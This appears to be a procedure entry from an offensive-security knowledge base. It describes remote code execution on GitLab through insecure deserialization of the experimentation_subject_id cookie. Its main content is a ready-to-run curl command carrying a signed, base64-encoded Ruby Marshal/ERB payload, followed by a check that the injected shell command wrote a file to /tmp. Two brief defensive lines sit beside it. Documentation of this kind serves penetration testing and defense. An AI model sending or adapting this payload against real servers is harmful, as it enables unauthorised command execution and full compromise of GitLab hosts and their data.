---
tags:
  - rce
  - deserialization
type: procedure
tools:
  - '[[tools/Rails-Console]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Linux
  - Web
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 9d5eeebf-1a84-4457-a763-5e06a12cd039
created_at: '2025-12-11T03:47:59.321Z'
updated_at: '2025-12-11T03:47:59.321Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Send Malicious Cookie for RCE

## Summary

This procedure sends a crafted cookie to GitLab to trigger insecure deserialization, executing arbitrary commands via the ERB payload.

## Description

The experimentation_subject_id cookie in :hybrid mode deserializes the marshalled object, running the embedded command. Verify execution by checking the output file.

## Requirements

1. Generated marshalled payload
2. Access to GitLab endpoint (e.g., /users/sign_in)
3. Server-side access for verification

## Defense

Defensive measures and detection strategies:

- Set cookie serializer to :json
- Monitor for anomalous cookie deserialization

## Objectives

1. Achieve remote code execution
2. Verify command success
3. Demonstrate full compromise

## Instructions

### Step 1: Send Malicious Request

**Command** ([[commands/curl-malicious-cookie]]):
```bash
curl -vvv 'http://gitlab-vm.local/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
```

> Sends the payload to trigger RCE.

### Step 2: Verify Execution

**Command** ([[commands/cat-verify-file]]):
```bash
cat /tmp/vakzz
```

> Checks for 'vakzz was here' in the file.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/curl-malicious-cookie]]
- [[commands/cat-verify-file]]

## Tools Used

- #curl

## Tags

- rce
- deserialization
